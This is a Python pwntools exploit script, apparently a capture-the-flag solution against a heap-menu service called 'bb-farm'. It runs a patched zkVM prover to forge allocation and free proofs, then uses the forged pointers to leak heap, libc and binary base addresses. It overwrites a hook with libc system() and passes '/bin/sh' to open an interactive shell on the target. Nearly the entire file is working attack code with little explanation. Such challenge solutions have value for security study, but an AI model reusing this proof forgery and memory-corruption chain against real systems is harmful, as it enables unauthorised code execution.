from __future__ import annotations

import hashlib
import json
import os
import subprocess
import sys
import time
from pathlib import Path

from pwn import *

ROOT = Path(__file__).resolve().parents[1]
BUILD_PROFILE = os.environ.get("CARGO_BUILD_PROFILE", "build-fast")

FIBONACCI_ROOT = ROOT / "solve/jolt-patched/examples/fibonacci"
PROOF_TARGET = ROOT / "release/artifacts"
FIBONACCI_BINARY = ROOT / f"solve/jolt-patched/target/{BUILD_PROFILE}/fibonacci"
CACHE_DIR = Path(__file__).resolve().parent / "cache"
CACHE_DIR.mkdir(parents=True, exist_ok=True)

LAST_ALLOC_PTRS: dict[int, int] = {}
CHUNK_SIZE = 64

context.log_level = os.environ.get("PWN_LOG", "info")

libc = ELF("./libc.so.6")
e = ELF("../release/bb-farm")


def ensure_binary() -> None:
    subprocess.run(
        [
            "cargo",
            "build",
            "--profile",
            BUILD_PROFILE,
        ],
        cwd=FIBONACCI_ROOT,
        check=True,
    )

def _run_dishonest_proofgen(
    state_hex: str,
    command_kind: str,
    command_arg: str,
    forged_output_hex: str,
    *,
    env_overrides: dict[str, str] | None = None,
) -> tuple[str, str]:
    cmd = [
        str(FIBONACCI_BINARY),
        state_hex,
        command_kind,
        command_arg,
        forged_output_hex,
        str(PROOF_TARGET),
    ]
    run_env = os.environ.copy()
    if env_overrides:
        run_env.update(env_overrides)
    result = subprocess.run(
        cmd,
        check=True,
        capture_output=True,
        text=True,
        env=run_env,
    )
    forged_hex = None
    proof_b64 = None
    for line in result.stdout.splitlines():
        if line.startswith("proof_b64="):
            proof_b64 = line.split("=", 1)[1].strip()
        elif line.startswith("forged_output_hex="):
            forged_hex = line.split("=", 1)[1].strip()
    if forged_hex is None or proof_b64 is None:
        raise RuntimeError(f"unexpected dishonest proofgen output: {result.stdout!r}")
    return forged_hex, proof_b64


def generate_alloc_proof_dishonest(
    state_hex: str,
    requested: int,
    forged_ptr: int,
) -> tuple[str, str]:
    cache_key = {
        "state_hex": state_hex,
        "requested": requested,
        "forged_ptr": forged_ptr,
    }
    cache_hash = hashlib.sha256(
        json.dumps(cache_key, sort_keys=True).encode()
    ).hexdigest()
    cache_path = CACHE_DIR / f"{cache_hash}.json"
    if cache_path.exists():
        cached = json.loads(cache_path.read_text())
        return cached["forged_hex"], cached["forged_proof"]

    legit_hex = "80e0cd090180e0cd09"
    forged_hex, forged_proof = _run_dishonest_proofgen(
        state_hex,
        "alloc",
        str(requested),
        legit_hex,
        env_overrides={"FORGED_PTR": hex(forged_ptr)},
    )
    cache_payload = {
        "forged_hex": forged_hex,
        "forged_proof": forged_proof,
    }
    cache_path.write_text(json.dumps(cache_payload))
    return forged_hex, forged_proof


def generate_free_proof(state_hex: str, ptr: int) -> tuple[str, str]:
    legit_hex = "80e0cd090180e0cd09"
    return _run_dishonest_proofgen(
        state_hex,
        "free",
        str(ptr),
        legit_hex,
        env_overrides={"FORGED_PTR": "0x0"},
    )


def read_menu(io) -> str:
    menu = io.recvuntil(b"> ")
    text = menu.decode()
    for line in text.splitlines():
        if line.startswith("state:"):
            return line.split(":", 1)[1].strip()
    raise AssertionError(f"state line missing in menu output: {text!r}")


def sendline(io, data: str) -> None:
    io.sendline(data.encode())


def recv_line_ignoring_csaw(io) -> str:
    while True:
        line = io.recvline().decode().strip()
        if not line.startswith("[csaw]"):
            return line


def allocate_slot_dishonest(
    io,
    slot_idx: int,
    forged_ptr: int,
    name: bytes,
    label_bytes: bytes,
) -> None:
    state_hex = read_menu(io)
    allocation_hex, allocation_proof = generate_alloc_proof_dishonest(
        state_hex,
        CHUNK_SIZE,
        forged_ptr,
    )

    import time

    start = time.time()

    sendline(io, "1")
    io.recvuntil(b"idx: ")
    sendline(io, str(slot_idx))

    io.recvuntil(b"proof (base64): ")
    sendline(io, allocation_proof)

    io.recvuntil(b"result (hex: state+ptr): ")
    sendline(io, allocation_hex)

    io.recvuntil(b"name: ")
    io.sendline(name)
    io.recvuntil(b"send label (8 bytes)\n")
    io.send(label_bytes)

    allocated_line = recv_line_ignoring_csaw(io)
    #assert allocated_line.startswith("allocated slot #"), allocated_line
    reported_idx = int(allocated_line.split("#", 1)[1].split()[0])
    #assert reported_idx == slot_idx

    ptr_text = allocated_line.split("@", 1)[1].strip()
    LAST_ALLOC_PTRS[slot_idx] = int(ptr_text, 16)

    end = time.time()

def free_slot(io, slot_idx: int) -> None:
    state_hex = read_menu(io)

    ptr = LAST_ALLOC_PTRS.get(slot_idx)
    if ptr is None:
        raise AssertionError(f"missing pointer for slot {slot_idx}")

    free_hex, free_proof = generate_free_proof(state_hex, ptr)

    sendline(io, "3")
    io.recvuntil(b"idx: ")
    sendline(io, str(slot_idx))

    io.recvuntil(b"proof (base64): ")
    sendline(io, free_proof)

    io.recvuntil(b"result (hex: state+ptr): ")
    sendline(io, free_hex)

    LAST_ALLOC_PTRS.pop(slot_idx, None)


def show_slot(io, slot_idx: int) -> tuple[str, bytes, str]:
    sendline(io, "2")
    io.recvuntil(b"idx: ")
    sendline(io, str(slot_idx))

    label_part = io.recvuntil(b": ", drop=True)
    digest_part = io.recvline()

    return label_part, bytes.fromhex(digest_part.decode())



base = 0x0133_7000
def test_dishonest_allocation_crash():
    io = remote("localhost", 5000)

    name_bytes = b"A" * 8
    label_bytes = b"/bin/sh\x00"

    allocate_slot_dishonest(io, 0, base, name_bytes, label_bytes)
    allocate_slot_dishonest(io, 1, base + 0x10, b"B" * 0x8000, label_bytes)
    data, leak = show_slot(io, 0)

    heap_leak = u64(leak)
    libc_freq = {}
    base_freq = {}

    for i in range(0, len(data), 8):
        curr = u64(data[i:i+8])
        if curr > 0x7e0000000000 and curr < 0x7ff000000000 and curr % 0x1000 > 0xb00:
            libc_vote = curr // 0x1000 * 0x1000 - 0x1e7000
            libc_freq[libc_vote] = libc_freq.get(libc_vote, 0) + 1
            print(hex(curr), hex(libc_vote))
        elif curr > 0x500000000000 and curr < heap_leak - 0x800000:
            base_vote = 0

            known = [0x341683, 0x33506c, 0x332d02, 0x4683e8, 0x458060, 0x4577f0, 0x456f88, 0x456e50]

            for offset in known:
                if curr % 0x1000 == offset % 0x1000:
                    base_vote = curr - offset

            if base_vote != 0:
                base_freq[base_vote] = base_freq.get(base_vote, 0) + 1
            else:
                pass
                #print("unused", hex(curr))

    libc_leak = max(libc_freq, key=libc_freq.get)
    base_leak = max(base_freq, key=base_freq.get)

    print(hex(heap_leak))
    print(hex(libc_leak))
    print(hex(base_leak))

    system = libc_leak + libc.symbols["system"]
    test_error = p64(system).decode()

    hook_offset = 0x046d460

    free_slot(io, 0)

    allocate_slot_dishonest(io, 0, base_leak + hook_offset, (b"A" * 0x28 + p64(system)).ljust(0x1337028, b"A"), label_bytes)

    pause()

    io.sendline(b"\xe2\x28\xa1")

    import time
    time.sleep(0.5)

    io.sendline(b"ls")

    io.interactive()

if __name__ == "__main__":
    ensure_binary()
    while True:
        try:
            test_dishonest_allocation_crash()
        except KeyboardInterrupt:
            raise
        except BaseException as e:
            print("failed", e)
